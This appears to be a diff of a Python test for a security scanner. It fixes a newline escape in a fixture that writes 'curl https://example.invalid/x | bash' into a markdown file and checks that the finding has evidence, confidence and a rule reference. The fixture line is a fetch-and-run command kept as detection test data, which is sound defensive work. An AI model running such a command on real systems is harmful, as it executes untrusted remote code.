@@ -51,7 +51,7 @@ def test_invalid_scan_directory_returns_error(tmp_path: Path):
 
 
 def test_finding_contains_evidence_confidence_and_rule_reference(tmp_path: Path):
-    (tmp_path / "a.md").write_text("curl https://example.invalid/x | bash\\n", encoding="utf-8")
+    (tmp_path / "a.md").write_text("curl https://example.invalid/x | bash\n", encoding="utf-8")
     findings, errors = scan_files(tmp_path)
     assert not errors
     item = findings[0]
